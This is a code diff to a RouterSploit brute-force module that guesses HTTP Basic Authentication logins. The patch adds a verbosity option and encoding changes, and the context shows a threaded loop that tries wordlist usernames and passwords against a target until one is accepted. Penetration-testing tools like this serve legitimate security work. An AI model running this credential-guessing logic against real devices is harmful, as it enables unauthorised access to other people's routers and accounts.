@@ -11,6 +11,7 @@ from routersploit import (
     print_success,
     print_table,
     sanitize_url,
+    boolify,
 )
 
 
@@ -33,6 +34,7 @@ class Exploit(exploits.Exploit):
     usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     path = exploits.Option('/', 'URL Path')
+    verbosity = exploits.Option('yes', 'Display authentication attempts')
 
     credentials = []
 
@@ -75,25 +77,26 @@ class Exploit(exploits.Exploit):
             print_error("Credentials not found")
 
     def target_function(self, running, data):
+        module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
 
-        print_status(name, 'process is starting...')
+        print_status(name, 'process is starting...', verbose=module_verbosity)
 
         while running.is_set():
             try:
                 user, password = data.next()
-                user = user.strip()
-                password = password.strip()
+                user = user.encode('utf-8').strip()
+                password = password.encode('utf-8').strip()
                 r = requests.get(url, auth=(user, password))
 
                 if r.status_code != 401:
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password)
+                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
                     self.credentials.append((user, password))
                 else:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
+                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
             except StopIteration:
                 break
 
-        print_status(name, 'process is terminated.')
+        print_status(name, 'process is terminated.', verbose=module_verbosity)
